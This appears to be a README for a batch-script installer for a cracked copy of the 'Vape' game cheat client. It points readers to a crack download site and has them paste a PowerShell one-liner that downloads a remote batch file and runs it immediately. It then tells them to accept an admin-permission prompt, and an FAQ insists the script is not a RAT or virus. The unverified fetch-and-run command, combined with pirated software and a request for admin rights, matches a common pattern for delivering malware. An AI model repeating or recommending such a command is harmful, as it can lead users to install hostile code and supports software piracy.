# ApeV4 installer
-----
This is a simple batch script I made, which makes the installation and use of the cracked version of Vape easier.

1. Download ape from a trustworty source (http://v4.apecrack.lol/)
2. Unpack the crack into a new folder.
3. SHIFT and RIGHT-CLICK in the folder
4. If youre using windows 11, click "Show more options" then "Open PowerShell window here"
   If youre using Windows 10, click "open PowerShell window here"
5. Paste this command in the blue console (PowerShell) ```Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ElDapo/apev4installer/main/RunVape.bat" -OutFile "RunVape.bat"; Start-Process -FilePath "RunVape.bat"```
6. Press ENTER and wait
7. It'll ask for admin-permissions. THATS THE CRACK, NOT MY LAUNCHER!

### Q: Is this a rat / virus?
A: No it isn't. Its not doing anything else what you would do if you'd use the vape crack yourself.
   Its just downloading and installing python, pip and pip-packages needed for the crack. 
   It checks the installation for missing files and starts the server.py after.
   After that it starts the Vape.exe using Kangaroo Launcher just like you would do by dragging them onto eachother.
